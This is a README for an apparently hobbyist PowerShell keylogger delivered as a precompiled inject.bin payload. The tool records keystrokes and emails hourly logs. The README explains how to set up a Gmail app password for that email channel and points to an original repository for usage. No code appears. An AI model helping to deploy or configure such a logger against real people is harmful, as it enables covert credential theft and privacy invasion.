This project is a retried project that I learned and was inspired by [CosmodiumCS's video](https://www.youtube.com/watch?v=wbprbJkiXfU&list=PL_dk67mLCSFHa5jDNvEuXuoafMHmTjn32&index=23) and their [main repository](https://github.com/PrettyBoyCosmo/DucKey-Logger).

I mainly focused on the core functionality of the keylogger and am using the same license for consistency. The implementation reflects my personal learning and development.

Duckey-Logger is basically a powershell keylogger which reads keystrokes and send hourly logs.

*There is already a compiled version (`inject.bin`) of that payload. But, you can recompile or modify it if you want*

## Important Note
Google officially turned off Less Secure App (LSA) access on May 30, 2022. Accounts created after that won't work with just an email and password. To make it work:
1. Create a new account.
2. Enable [2-Step Verification](https://myaccount.google.com/security).
3. Generate an [App Password](https://myaccount.google.com/apppasswords).
4. Use the generated password in the "Password" section of the code.

## How to Use
For a detailed guide on how to use this project properly, please refer to the original [repository by CosmodiumCS](https://github.com/PrettyBoyCosmo/DucKey-Logger), which provides step-by-step instructions.

## License
This project is licensed under the BSD 3-Clause License. See the [LICENSE](LICENSE) file for details.